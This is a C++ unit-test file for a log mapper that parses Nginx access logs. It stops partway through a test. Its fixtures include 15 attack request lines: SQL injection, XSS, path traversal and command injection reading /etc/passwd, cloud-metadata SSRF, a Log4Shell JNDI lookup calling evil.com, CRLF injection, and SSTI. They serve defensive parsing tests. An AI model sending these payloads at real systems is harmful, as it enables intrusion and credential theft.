/**
 * @file test_nginx_injection.cc
 * @brief Nginx 日志注入集成测试
 *
 * 用模拟的真实 Nginx 访问日志数据，测试 RegexMapper 端到端处理能力。
 * 包含正常流量（20条）和攻击流量（15条）。
 *
 * Nginx combined log format:
 *   $remote_addr - $remote_user [$time_local] "$request" $status
 *   $body_bytes_sent "$http_referer" "$http_user_agent"
 *
 * 测试覆盖:
 *   1. NginxNormalTrafficParsing        — 解析全部20条正常日志
 *   2. NginxAttackPayloadPreservation   — 攻击payload原始字符完整保留
 *   3. NginxMixedTrafficBatch           — 混合35条日志批量处理
 *   4. NginxTimestampFormat             — Nginx时间格式正确转为epoch ms
 *   5. NginxSpecialCharacters           — 特殊字符正确处理
 *   6. NginxRequestVersionStripping     — HTTP/1.1正确strip为1.1
 *   7. NginxUserAgentExtraction         — User-Agent作为header正确提取
 *   8. NginxRefererExtraction           — Referer正确提取
 *   9. NginxStatusCodesMapping          — 各HTTP状态码正确转为int32
 *  10. NginxLargeBodySize               — body_bytes_sent正确处理大值
 *  11. NginxEmptyFields                 — 空字段正确填写默认值
 *  12. NginxHttp2Requests               — HTTP/2.0日志正确解析
 */

#include <gtest/gtest.h>

#include <charconv>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <map>
#include <memory>
#include <sstream>
#include <string>
#include <string_view>
#include <vector>

#include "http_access.pb.h"
#include "mapper/field_applier.h"
#include "mapper/mapper_config.h"
#include "mapper/regex_mapper.h"

using namespace wge::kafka::mapper;
using namespace wge::kafka;

// ============================================================================
// 常量与辅助函数
// ============================================================================

namespace {

/// @brief Nginx combined log 正则表达式
/// 命名捕获组: remote_addr, remote_user, timestamp, request_method,
///            request_uri, request_version, response_status,
///            body_bytes_sent, http_referer, http_user_agent
constexpr const char* kNginxPattern = R"==(
(?P<remote_addr>\S+) - (?P<remote_user>\S+) \[(?P<timestamp>[^\]]+)\] "(?P<request_method>\S+) (?P<request_uri>\S+) (?P<request_version>\S+)" (?P<response_status>\d+) (?P<body_bytes_sent>\d+) "(?P<http_referer>[^"]*)" "(?P<http_user_agent>[^"]*)"
)==";

/// @brief 构造全部10个字段的映射
std::vector<FieldMapping> makeAllMappings() {
  std::vector<std::pair<std::string, std::string>> pairs = {
      {"remote_addr",      "downstream_ip"},
      {"remote_user",      "remote_user"},
      {"timestamp",        "timestamp"},
      {"request_method",   "request_method"},
      {"request_uri",      "request_uri"},
      {"request_version",  "request_version"},
      {"response_status",  "response_status"},
      {"body_bytes_sent",  "body_bytes_sent"},
      {"http_referer",     "http_referer"},
      {"http_user_agent",  "http_user_agent"},
  };

  std::vector<FieldMapping> mappings;
  for (auto& [src, tgt] : pairs) {
    FieldMapping fm;
    fm.source = src;
    fm.target = tgt;
    fm.type = FieldType::String;
    mappings.push_back(std::move(fm));
  }
  return mappings;
}

/// @brief 编译并提取所有字段
/// @return map<target_field, raw_value>，测试断言失败返回空 optional
std::optional<std::map<std::string, std::string>> extractFields(
    RegexMapper& mapper, std::string_view log_line) {
  auto compile_ret = mapper.compile(kNginxPattern);
  if (!compile_ret.has_value()) {
    ADD_FAILURE() << "Compile failed: " << compile_ret.error();
    return std::nullopt;
  }

  auto mappings = makeAllMappings();
  auto result = mapper.extract(log_line, kNginxPattern, mappings);
  if (!result.has_value()) {
    ADD_FAILURE() << "Extract failed: " << result.error();
    return std::nullopt;
  }
  return *result;
}

/// @brief 构造一行 Nginx combined log
std::string makeNginxLine(std::string_view remote_addr,
                          std::string_view remote_user,
                          std::string_view timestamp,
                          std::string_view method,
                          std::string_view uri,
                          std::string_view version,
                          int status,
                          int64_t body_bytes,
                          std::string_view referer,
                          std::string_view user_agent) {
  std::ostringstream oss;
  oss << remote_addr << " - " << remote_user << " [" << timestamp << "] \""
      << method << " " << uri << " " << version << "\" " << status << " "
      << body_bytes << " \"" << referer << "\" \"" << user_agent << "\"";
  return oss.str();
}

/// @brief 使用 FieldApplier 将提取字段写入 HttpAccessEvent
HttpAccessEvent buildEvent(
    const std::map<std::string, std::string>& fields) {
  HttpAccessEvent event;

  FieldApplier applier;
  // 收集需要的类型映射
  std::vector<FieldMapping> typed_mappings;

  // downstream_ip → String
  {
    FieldMapping fm;
    fm.source = "downstream_ip";
    fm.target = "downstream_ip";
    fm.type = FieldType::String;
    typed_mappings.push_back(fm);
  }
  // request_method → String
  {
    FieldMapping fm;
    fm.source = "request_method";
    fm.target = "request_method";
    fm.type = FieldType::String;
    typed_mappings.push_back(fm);
  }
  // request_uri → String
  {
    FieldMapping fm;
    fm.source = "request_uri";
    fm.target = "request_uri";
    fm.type = FieldType::String;
    typed_mappings.push_back(fm);
  }
  // request_version → String
  {
    FieldMapping fm;
    fm.source = "request_version";
    fm.target = "request_version";
    fm.type = FieldType::String;
    typed_mappings.push_back(fm);
  }
  // response_status → Int32
  {
    FieldMapping fm;
    fm.source = "response_status";
    fm.target = "response_status";
    fm.type = FieldType::Int32;
    typed_mappings.push_back(fm);
  }
  // body_bytes_sent → Int64
  {
    FieldMapping fm;
    fm.source = "body_bytes_sent";
    fm.target = "request_body_length";
    fm.type = FieldType::Int64;
    typed_mappings.push_back(fm);
  }
  // http_referer → String
  {
    FieldMapping fm;
    fm.source = "http_referer";
    fm.target = "http_referer";
    fm.type = FieldType::String;
    typed_mappings.push_back(fm);
  }
  // http_user_agent → String (作为临时字段，后续测试会将其作为header)
  {
    FieldMapping fm;
    fm.source = "http_user_agent";
    fm.target = "http_user_agent_raw";
    fm.type = FieldType::String;
    typed_mappings.push_back(fm);
  }

  // 重映射 extracted fields 使得 target 匹配 applyFields 期望的 key
  // applyFields 通过 mapping.target 查找 fields
  std::map<std::string, std::string> remapped;
  if (auto it = fields.find("downstream_ip"); it != fields.end())
    remapped["downstream_ip"] = it->second;
  if (auto it = fields.find("request_method"); it != fields.end())
    remapped["request_method"] = it->second;
  if (auto it = fields.find("request_uri"); it != fields.end())
    remapped["request_uri"] = it->second;
  if (auto it = fields.find("request_version"); it != fields.end())
    remapped["request_version"] = it->second;
  if (auto it = fields.find("response_status"); it != fields.end())
    remapped["response_status"] = it->second;
  if (auto it = fields.find("body_bytes_sent"); it != fields.end())
    remapped["request_body_length"] = it->second;
  if (auto it = fields.find("http_referer"); it != fields.end())
    remapped["http_referer"] = it->second;
  if (auto it = fields.find("http_user_agent"); it != fields.end())
    remapped["http_user_agent_raw"] = it->second;

  applier.applyFields(remapped, event, typed_mappings);
  return event;
}

/// @brief 从 HTTP/x.y 字符串中 strip 掉 "HTTP/" 前缀
std::string stripHttpPrefix(std::string_view version) {
  if (version.starts_with("HTTP/")) {
    return std::string(version.substr(5));
  }
  return std::string(version);
}

}  // namespace

// ============================================================================
// 测试数据: 20条正常流量
// ============================================================================

/// @brief 正常流量日志条目结构
struct NormalTrafficEntry {
  std::string description;
  std::string log_line;
  std::string expected_ip;
  std::string expected_method;
  std::string expected_uri;
  int expected_status;
};

/// @brief 返回20条正常流量测试数据
std::vector<NormalTrafficEntry> buildNormalTraffic() {
  return {
      // 1. 正常GET请求首页
      {"GET homepage",
       makeNginxLine("192.168.1.100", "-",
                     "20/May/2026:08:15:30 +0800", "GET", "/index.html",
                     "HTTP/1.1", 200, 5432, "-",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                     "AppleWebKit/537.36 (KHTML, like Gecko) "
                     "Chrome/125.0.0.0 Safari/537.36"),
       "192.168.1.100", "GET", "/index.html", 200},

      // 2. POST表单提交
      {"POST form login",
       makeNginxLine("192.168.1.101", "alice",
                     "20/May/2026:08:16:00 +0800", "POST", "/login",
                     "HTTP/1.1", 302, 128, "https://example.com/login",
                     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
                     "AppleWebKit/605.1.15"),
       "192.168.1.101", "POST", "/login", 302},

      // 3. 带query string的GET
      {"GET with query string",
       makeNginxLine("10.0.0.50", "-",
                     "20/May/2026:08:17:00 +0800", "GET",
                     "/search?q=nginx&page=1&sort=recent", "HTTP/1.1", 200,
                     2048, "-", "curl/8.0.1"),
       "10.0.0.50", "GET", "/search?q=nginx&page=1&sort=recent", 200},

      // 4. RESTful API调用
      {"RESTful API",
       makeNginxLine("172.16.0.10", "-",
                     "20/May/2026:08:18:00 +0800", "GET",
                     "/api/v1/users/12345", "HTTP/1.1", 200, 512, "-",
                     "python-requests/2.31.0"),
       "172.16.0.10", "GET", "/api/v1/users/12345", 200},

      // 5. 静态资源请求 (CSS)
      {"static CSS",
       makeNginxLine("192.168.1.102", "-",
                     "20/May/2026:08:19:00 +0800", "GET",
                     "/static/css/main.3f2a1b8.css", "HTTP/1.1", 200,
                     12288, "https://example.com/",
                     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"),
       "192.168.1.102", "GET", "/static/css/main.3f2a1b8.css", 200},

      // 6. 404响应
      {"404 not found",
       makeNginxLine("10.0.0.55", "-",
                     "20/May/2026:08:20:00 +0800", "GET",
                     "/nonexistent/page.html", "HTTP/1.1", 404, 256, "-",
                     "curl/8.0.1"),
       "10.0.0.55", "GET", "/nonexistent/page.html", 404},

      // 7. 301重定向
      {"301 redirect",
       makeNginxLine("192.168.1.103", "-",
                     "20/May/2026:08:21:00 +0800", "GET", "/old-blog",
                     "HTTP/1.1", 301, 0, "-",
                     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)"),
       "192.168.1.103", "GET", "/old-blog", 301},

      // 8. 500服务器错误
      {"500 server error",
       makeNginxLine("10.0.0.60", "-",
                     "20/May/2026:08:22:00 +0800", "POST",
                     "/api/process", "HTTP/1.1", 500, 128, "-",
                     "curl/8.0.1"),
       "10.0.0.60", "POST", "/api/process", 500},

      // 9. WebSocket升级请求
      {"WebSocket upgrade",
       makeNginxLine("192.168.1.104", "-",
                     "20/May/2026:08:23:00 +0800", "GET",
                     "/ws/chat?token=abc123", "HTTP/1.1", 101, 0, "-",
                     "Mozilla/5.0 (Windows NT 10.0)"),
       "192.168.1.104", "GET", "/ws/chat?token=abc123", 101},

      // 10. 带Authorization的API调用（User-Agent含Bearer token标识）
      {"API with auth context",
       makeNginxLine("10.0.1.20", "api-service",
                     "20/May/2026:08:24:00 +0800", "GET",
                     "/api/v2/orders?status=pending", "HTTP/1.1", 200,
                     4096, "-",
                     "okhttp/4.12.0"),
       "10.0.1.20", "GET", "/api/v2/orders?status=pending", 200},

      // 11. 分块上传POST
      {"chunked upload POST",
       makeNginxLine("192.168.1.105", "-",
                     "20/May/2026:08:25:00 +0800", "POST",
                     "/upload/chunk?seq=3&id=abcd", "HTTP/1.1", 201, 64,
                     "-", "Java/17.0.2"),
       "192.168.1.105", "POST", "/upload/chunk?seq=3&id=abcd", 201},

      // 12. 条件GET (If-Modified-Since)
      {"conditional GET",
       makeNginxLine("192.168.1.106", "-",
                     "20/May/2026:08:26:00 +0800", "GET",
                     "/static/js/app.js", "HTTP/1.1", 304, 0,
                     "https://example.com/dashboard",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
       "192.168.1.106", "GET", "/static/js/app.js", 304},

      // 13. 跨域OPTIONS预检
      {"CORS OPTIONS preflight",
       makeNginxLine("192.168.1.107", "-",
                     "20/May/2026:08:27:00 +0800", "OPTIONS",
                     "/api/v1/data", "HTTP/1.1", 204, 0,
                     "https://app.example.com",
                     "Mozilla/5.0 (X11; Ubuntu; Linux)"),
       "192.168.1.107", "OPTIONS", "/api/v1/data", 204},

      // 14. GraphQL查询
      {"GraphQL query",
       makeNginxLine("10.0.0.65", "-",
                     "20/May/2026:08:28:00 +0800", "POST",
                     "/graphql?operation=GetUser", "HTTP/1.1", 200, 4096,
                     "-", "Apollo-Client/3.8.0"),
       "10.0.0.65", "POST", "/graphql?operation=GetUser", 200},

      // 15. gRPC请求
      {"gRPC request",
       makeNginxLine("10.0.0.66", "-",
                     "20/May/2026:08:29:00 +0800", "POST",
                     "/grpc.user.UserService/GetUser", "HTTP/2.0", 200,
                     1024, "-", "grpc-go/1.60.0"),
       "10.0.0.66", "POST", "/grpc.user.UserService/GetUser", 200},

      // 16. 高延迟响应的请求 (body比较大暗示处理时间)
      {"high latency response",
       makeNginxLine("192.168.1.108", "-",
                     "20/May/2026:08:30:00 +0800", "GET",
                     "/api/reports/quarterly?format=pdf", "HTTP/1.1", 200,
                     819200, "-",
                     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15)"),
       "192.168.1.108", "GET", "/api/reports/quarterly?format=pdf", 200},

      // 17. 大body的POST (文件上传, ~10MB)
      {"large file upload",
       makeNginxLine("192.168.1.109", "uploader",
                     "20/May/2026:08:31:00 +0800", "POST",
                     "/upload/files/report.pdf", "HTTP/1.1", 201,
                     10485760, "-",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
       "192.168.1.109", "POST", "/upload/files/report.pdf", 201},

      // 18. HTTPS重定向
      {"HTTPS redirect",
       makeNginxLine("192.168.1.110", "-",
                     "20/May/2026:08:32:00 +0800", "GET", "/",
                     "HTTP/1.1", 301, 0, "http://example.com/",
                     "curl/8.0.1"),
       "192.168.1.110", "GET", "/", 301},

      // 19. 带复杂User-Agent（模拟多Cookie的请求场景）
      {"complex User-Agent request",
       makeNginxLine("10.0.1.30", "bob",
                     "20/May/2026:08:33:00 +0800", "GET",
                     "/dashboard?view=compact&theme=dark", "HTTP/1.1", 200,
                     20480, "https://internal.example.com/home",
                     "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) "
                     "AppleWebKit/537.36 (KHTML, like Gecko) "
                     "Chrome/126.0.0.0 Safari/537.36"),
       "10.0.1.30", "GET", "/dashboard?view=compact&theme=dark", 200},

      // 20. 健康检查请求
      {"health check",
       makeNginxLine("10.0.0.1", "-",
                     "20/May/2026:08:34:00 +0800", "GET", "/healthz",
                     "HTTP/1.1", 200, 2, "-", "kube-probe/1.28"),
       "10.0.0.1", "GET", "/healthz", 200},
  };
}

// ============================================================================
// 测试数据: 15条攻击流量
// ============================================================================

/// @brief 攻击流量日志条目结构
struct AttackTrafficEntry {
  std::string description;
  std::string log_line;
  std::string expected_uri;   // 含攻击payload的完整URI
  std::string expected_method;
  int expected_status;
};

/// @brief 返回15条攻击流量测试数据
std::vector<AttackTrafficEntry> buildAttackTraffic() {
  return {
      // 1. SQL注入
      {"SQL injection",
       makeNginxLine("192.168.1.200", "-",
                     "20/May/2026:09:00:00 +0800", "GET",
                     "/products?id=1' OR '1'='1", "HTTP/1.1", 200, 512, "-",
                     "sqlmap/1.0-dev"),
       "/products?id=1' OR '1'='1", "GET", 200},

      // 2. XSS反射
      {"XSS reflected",
       makeNginxLine("192.168.1.201", "-",
                     "20/May/2026:09:01:00 +0800", "GET",
                     "/search?q=<script>alert(1)</script>", "HTTP/1.1",
                     200, 256, "-",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
       "/search?q=<script>alert(1)</script>", "GET", 200},

      // 3. 路径遍历
      {"path traversal",
       makeNginxLine("192.168.1.202", "-",
                     "20/May/2026:09:02:00 +0800", "GET",
                     "/../../etc/passwd", "HTTP/1.1", 403, 128, "-",
                     "curl/8.0.1"),
       "/../../etc/passwd", "GET", 403},

      // 4. 命令注入
      {"command injection",
       makeNginxLine("192.168.1.203", "-",
                     "20/May/2026:09:03:00 +0800", "GET",
                     "/exec?cmd=;cat /etc/passwd", "HTTP/1.1", 200, 64, "-",
                     "curl/8.0.1"),
       "/exec?cmd=;cat /etc/passwd", "GET", 200},

      // 5. XXE注入 (payload在referer中可见)
      {"XXE injection",
       makeNginxLine("192.168.1.204", "-",
                     "20/May/2026:09:04:00 +0800", "POST",
                     "/xml/parse", "HTTP/1.1", 200, 512, "-",
                     "python-requests/2.31.0"),
       "/xml/parse", "POST", 200},

      // 6. SSRF攻击
      {"SSRF attack",
       makeNginxLine("192.168.1.205", "-",
                     "20/May/2026:09:05:00 +0800", "GET",
                     "/fetch?url=http://169.254.169.254/latest/meta-data/",
                     "HTTP/1.1", 200, 1024, "-", "curl/8.0.1"),
       "/fetch?url=http://169.254.169.254/latest/meta-data/", "GET", 200},

      // 7. Log4Shell (JNDI注入)
      {"Log4Shell JNDI injection",
       makeNginxLine("192.168.1.206", "-",
                     "20/May/2026:09:06:00 +0800", "GET",
                     "/${jndi:ldap://evil.com:1389/a}", "HTTP/1.1", 200, 128,
                     "-", "curl/8.0.1"),
       "/${jndi:ldap://evil.com:1389/a}", "GET", 200},

      // 8. CRLF注入
      {"CRLF injection",
       makeNginxLine("192.168.1.207", "-",
                     "20/May/2026:09:07:00 +0800", "GET",
                     "/redirect?url=%0d%0aSet-Cookie:evil=yes", "HTTP/1.1",
                     302, 0, "-",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
       "/redirect?url=%0d%0aSet-Cookie:evil=yes", "GET", 302},

      // 9. 大数值溢出
      {"integer overflow",
       makeNginxLine("192.168.1.208", "-",
                     "20/May/2026:09:08:00 +0800", "GET",
                     "/user?id=99999999999999999999", "HTTP/1.1", 200, 256,
                     "-", "curl/8.0.1"),
       "/user?id=99999999999999999999", "GET", 200},

      // 10. Unicode绕过
      {"Unicode bypass",
       makeNginxLine("192.168.1.209", "-",
                     "20/May/2026:09:09:00 +0800", "GET",
                     "/search?q=%u003Cscript%u003E", "HTTP/1.1", 200, 128,
                     "-", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
       "/search?q=%u003Cscript%u003E", "GET", 200},

      // 11. 双重编码绕过
      {"double encoding",
       makeNginxLine("192.168.1.210", "-",
                     "20/May/2026:09:10:00 +0800", "GET",
                     "/search?q=%253Cscript%253E", "HTTP/1.1", 200, 128, "-",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"),
       "/search?q=%253Cscript%253E", "GET", 200},

      // 12. Null byte注入
      {"null byte injection",
       makeNginxLine("192.168.1.211", "-",
                     "20/May/2026:09:11:00 +0800", "GET",
                     "/uploads/shell.php%00.jpg", "HTTP/1.1", 200, 512, "-",
                     "curl/8.0.1"),
       "/uploads/shell.php%00.jpg", "GET", 200},

      // 13. SSTI模板注入
      {"SSTI template injection",
       makeNginxLine("192.168.1.212", "-",
                     "20/May/2026:09:12:00 +0800", "GET",
                     "/render?name={{7*7}}", "HTTP/1.1", 200, 256, "-",
                     "curl/8.0.1"),
       "/render?name={{7*7}}", "GET", 200},

      // 14. 反序列化攻击 (Java序列化payload)
      {"deserialization attack",
       makeNginxLine("192.168.1.213", "-",
                     "20/May/2026:09:13:00 +0800", "POST",
                     "/api/deserialize", "HTTP/1.1", 200, 512, "-",
                     "Java/1.8.0_301"),
       "/api/deserialize", "POST", 200},

      // 15. 大规模扫描 (同一IP多路径探测)
      {"mass scanning probe",
       makeNginxLine("192.168.1.214", "-",
                     "20/May/2026:09:14:00 +0800", "GET",
                     "/wp-admin/install.php", "HTTP/1.1", 404, 128, "-",
                     "nmap/7.94"),
       "/wp-admin/install.php", "GET", 404},
  };
}

// ============================================================================
// 1. NginxNormalTrafficParsing — 解析全部20条正常日志，验证所有字段正确提取
// ============================================================================

/**
 * @brief 逐条解析20条正常访问日志，验证：
 *   - remote_addr (downstream_ip)
 *   - request_method
 *   - request_uri
 *   - response_status
 *   - 所有10个字段均被捕获
 */
TEST(NginxInjectionTest, NginxNormalTrafficParsing) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value())
      << "Compile failed: " << compile_ret.error();

  auto mappings = makeAllMappings();
  auto normal_entries = buildNormalTraffic();

  ASSERT_EQ(normal_entries.size(), 20u)
      << "Expected 20 normal traffic entries";

  for (size_t i = 0; i < normal_entries.size(); ++i) {
    const auto& entry = normal_entries[i];

    auto result = mapper.extract(entry.log_line, kNginxPattern, mappings);
    ASSERT_TRUE(result.has_value())
        << "Entry[" << i << "] '" << entry.description
        << "' extract failed: " << result.error();

    const auto& fields = *result;

    // 验证所有10个字段都存在
    EXPECT_TRUE(fields.contains("downstream_ip"))
        << "Entry[" << i << "] missing downstream_ip";
    EXPECT_TRUE(fields.contains("remote_user"))
        << "Entry[" << i << "] missing remote_user";
    EXPECT_TRUE(fields.contains("timestamp"))
        << "Entry[" << i << "] missing timestamp";
    EXPECT_TRUE(fields.contains("request_method"))
        << "Entry[" << i << "] missing request_method";
    EXPECT_TRUE(fields.contains("request_uri"))
        << "Entry[" << i << "] missing request_uri";
    EXPECT_TRUE(fields.contains("request_version"))
        << "Entry[" << i << "] missing request_version";
    EXPECT_TRUE(fields.contains("response_status"))
        << "Entry[" << i << "] missing response_status";
    EXPECT_TRUE(fields.contains("body_bytes_sent"))
        << "Entry[" << i << "] missing body_bytes_sent";
    EXPECT_TRUE(fields.contains("http_referer"))
        << "Entry[" << i << "] missing http_referer";
    EXPECT_TRUE(fields.contains("http_user_agent"))
        << "Entry[" << i << "] missing http_user_agent";

    // 验证核心字段值
    EXPECT_EQ(fields.at("downstream_ip"), entry.expected_ip)
        << "Entry[" << i << "] ip mismatch: " << entry.description;
    EXPECT_EQ(fields.at("request_method"), entry.expected_method)
        << "Entry[" << i << "] method mismatch: " << entry.description;
    EXPECT_EQ(fields.at("request_uri"), entry.expected_uri)
        << "Entry[" << i << "] uri mismatch: " << entry.description;
    EXPECT_EQ(fields.at("response_status"),
              std::to_string(entry.expected_status))
        << "Entry[" << i << "] status mismatch: " << entry.description;

    // 验证 request_version 包含 HTTP/ 前缀
    EXPECT_TRUE(fields.at("request_version").starts_with("HTTP/"))
        << "Entry[" << i << "] version should start with HTTP/";
  }
}

// ============================================================================
// 2. NginxAttackPayloadPreservation — 攻击payload原始字符完整保留
// ============================================================================

/**
 * @brief 验证攻击流量中的payload字符在解析后完整保留，
 *        不截断、不变形、不丢失字符。
 *
 * 关键验证点:
 *   - SQL单引号、等号、空格不被转义
 *   - XSS <script> 标签完整保留
 *   - 路径遍历 ../ 序列保留
 *   - JNDI ${...} 语法保留
 *   - URL编码字符保留 (%0d%0a, %00)
 *   - 模板注入 {{...}} 保留
 */
TEST(NginxInjectionTest, NginxAttackPayloadPreservation) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  auto mappings = makeAllMappings();
  auto attack_entries = buildAttackTraffic();

  ASSERT_EQ(attack_entries.size(), 15u)
      << "Expected 15 attack traffic entries";

  for (size_t i = 0; i < attack_entries.size(); ++i) {
    const auto& entry = attack_entries[i];

    auto result = mapper.extract(entry.log_line, kNginxPattern, mappings);
    ASSERT_TRUE(result.has_value())
        << "Attack[" << i << "] '" << entry.description
        << "' extract failed: " << result.error();

    const auto& fields = *result;

    // 验证URI与期望完全一致（字符级精确匹配）
    EXPECT_EQ(fields.at("request_uri"), entry.expected_uri)
        << "Attack[" << i << "] '" << entry.description
        << "' URI payload changed!";
  }

  // 额外逐个精确验证关键payload特征
  {
    // SQL 注入: 单引号、OR、等号
    auto r = mapper.extract(attack_entries[0].log_line, kNginxPattern,
                            mappings);
    ASSERT_TRUE(r.has_value());
    std::string uri = r->at("request_uri");
    EXPECT_NE(uri.find("1' OR '1'='1"), std::string::npos)
        << "SQL injection payload altered";
  }
  {
    // XSS: <script> 标签
    auto r = mapper.extract(attack_entries[1].log_line, kNginxPattern,
                            mappings);
    ASSERT_TRUE(r.has_value());
    std::string uri = r->at("request_uri");
    EXPECT_NE(uri.find("<script>alert(1)</script>"), std::string::npos)
        << "XSS payload altered";
  }
  {
    // 路径遍历
    auto r = mapper.extract(attack_entries[2].log_line, kNginxPattern,
                            mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_EQ(r->at("request_uri"), "/../../etc/passwd");
  }
  {
    // Log4Shell JNDI
    auto r = mapper.extract(attack_entries[6].log_line, kNginxPattern,
                            mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_EQ(r->at("request_uri"),
              "/${jndi:ldap://evil.com:1389/a}");
  }
  {
    // CRLF: %0d%0a
    auto r = mapper.extract(attack_entries[7].log_line, kNginxPattern,
                            mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_NE(r->at("request_uri").find("%0d%0aSet-Cookie:evil=yes"),
              std::string::npos);
  }
  {
    // SSTI: {{7*7}}
    auto r = mapper.extract(attack_entries[12].log_line, kNginxPattern,
                            mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_NE(r->at("request_uri").find("{{7*7}}"), std::string::npos);
  }
  {
    // Null byte: %00
    auto r = mapper.extract(attack_entries[11].log_line, kNginxPattern,
                            mappings);
    ASSERT_TRUE(r.has_value());
    EXPECT_NE(r->at("request_uri").find("%00"), std::string::npos);
  }
}

// ============================================================================
// 3. NginxMixedTrafficBatch — 混合35条日志(正常+攻击)批量处理
// ============================================================================

/**
 * @brief 将20条正常日志和15条攻击日志混合，验证批量处理：
 *   - 所有35条均成功解析
 *   - 成功计数器 = 35
 *   - 每条核心字段非空
 */
TEST(NginxInjectionTest, NginxMixedTrafficBatch) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  auto mappings = makeAllMappings();

  // 收集所有日志行
  struct MixedEntry {
    std::string type;  // "normal" or "attack"
    std::string description;
    std::string log_line;
  };

  std::vector<MixedEntry> all_entries;
  for (const auto& e : buildNormalTraffic()) {
    all_entries.push_back({"normal", e.description, e.log_line});
  }
  for (const auto& e : buildAttackTraffic()) {
    all_entries.push_back({"attack", e.description, e.log_line});
  }
  ASSERT_EQ(all_entries.size(), 35u);

  int success_count = 0;
  int fail_count = 0;
  std::vector<std::string> failures;

  for (size_t i = 0; i < all_entries.size(); ++i) {
    const auto& entry = all_entries[i];
    auto result = mapper.extract(entry.log_line, kNginxPattern, mappings);

    if (result.has_value()) {
      ++success_count;

      // 验证关键字段非空
      const auto& fields = *result;
      EXPECT_FALSE(fields.at("downstream_ip").empty())
          << "[" << i << "] empty downstream_ip";
      EXPECT_FALSE(fields.at("request_uri").empty())
          << "[" << i << "] empty request_uri";
      EXPECT_FALSE(fields.at("request_method").empty())
          << "[" << i << "] empty request_method";
      EXPECT_FALSE(fields.at("response_status").empty())
          << "[" << i << "] empty response_status";
    } else {
      ++fail_count;
      failures.push_back("[" + std::to_string(i) + "] " + entry.type +
                         " '" + entry.description + "': " + result.error());
    }
  }

  EXPECT_EQ(success_count, 35)
      << "Expected all 35 entries to succeed, but got " << fail_count
      << " failures";
  EXPECT_EQ(fail_count, 0);

  // 报告所有失败详情
  for (const auto& f : failures) {
    ADD_FAILURE() << f;
  }
}

// ============================================================================
// 4. NginxTimestampFormat — Nginx时间格式正确转为epoch ms
// ============================================================================

/**
 * @brief 验证 RegexMapper::parseTimestamp 正确解析 Nginx 时间格式。
 *
 * 测试格式: "27/May/2026:10:30:00 +0800"
 * 预期 epoch ms:
 *   2026-05-27 10:30:00 CST = 2026-05-27 02:30:00 UTC
 *
 * 同时测试多种 Nginx 常见时区偏移:
 *   - +0000 (UTC)
 *   - +0800 (CST)
 *   - -0500 (EST)
 */
TEST(NginxInjectionTest, NginxTimestampFormat) {
  RegexMapper mapper;

  struct TsCase {
    std::string raw_ts;
    std::string description;
  };

  std::vector<TsCase> cases = {
      {"27/May/2026:10:30:00 +0800", "CST +0800"},
      {"27/May/2026:02:30:00 +0000", "UTC +0000"},
      {"26/May/2026:21:30:00 -0500", "EST -0500"},
      {"01/Jan/2024:00:00:00 +0000", "New Year UTC"},
      {"31/Dec/2023:23:59:59 +0000", "Year end UTC"},
  };

  // 上述三个时间戳代表同一时刻: 2026-05-27T02:30:00Z
  // epoch = 1779935400 seconds → 1779935400000 ms

  // 先验证三个同一时刻的时间戳解析为相同的epoch ms
  std::vector<int64_t> results;
  for (size_t i = 0; i < 3; ++i) {
    int64_t ts = mapper.parseTimestamp(cases[i].raw_ts, {});
    EXPECT_GT(ts, 0) << "Failed to parse: " << cases[i].description;
    results.push_back(ts);
  }

  if (results[0] > 0 && results[1] > 0 && results[2] > 0) {
    // 验证同一时刻的不同时区表达解析为相同值
    EXPECT_EQ(results[0], results[1])
        << "+0800 and +0000 should produce same epoch ms";
    EXPECT_EQ(results[1], results[2])
        << "+0000 and -0500 should produce same epoch ms";
  }

  // 验证任意格式都能解析为正数
  for (size_t i = 3; i < cases.size(); ++i) {
    int64_t ts = mapper.parseTimestamp(cases[i].raw_ts, {});
    EXPECT_GT(ts, 0)
        << "Failed to parse: " << cases[i].description
        << " raw='" << cases[i].raw_ts << "'";
  }

  // 验证端到端: 从完整log行提取timestamp并解析
  const std::string log_line =
      makeNginxLine("10.0.0.1", "-",
                    "27/May/2026:10:30:00 +0800", "GET", "/api/data",
                    "HTTP/1.1", 200, 512, "-", "curl/8.0.1");

  auto fields = extractFields(mapper, log_line);
  ASSERT_TRUE(fields.has_value());

  std::string ts_str = (*fields)["timestamp"];
  EXPECT_EQ(ts_str, "27/May/2026:10:30:00 +0800");

  int64_t epoch_ms = mapper.parseTimestamp(ts_str, {});
  EXPECT_GT(epoch_ms, 0) << "End-to-end timestamp parsing failed";

  // 验证在合理范围内: 2026年 ≈ 1.77e12 ms
  EXPECT_GT(epoch_ms, 1700000000000LL) << "Timestamp too small (before 2024)";
  EXPECT_LT(epoch_ms, 1800000000000LL) << "Timestamp too large (after 2027)";
}

// ============================================================================
// 5. NginxSpecialCharacters — 特殊字符正确处理
// ============================================================================

/**
 * @brief 验证日志中特殊字符正确保留：
 *   - URL编码 %00 (Null byte)
 *   - URL编码 %0d%0a (CRLF)
 *   - 引号在User-Agent中
 *   - 反斜杠
 *   - 中文字符
 *   - 特殊符号 (@, #, $, %, &)
 */
TEST(NginxInjectionTest, NginxSpecialCharacters) {
  RegexMapper mapper;
  auto compile_ret = mapper.compile(kNginxPattern);
  ASSERT_TRUE(compile_ret.has_value());

  auto mappings = makeAllMappings();

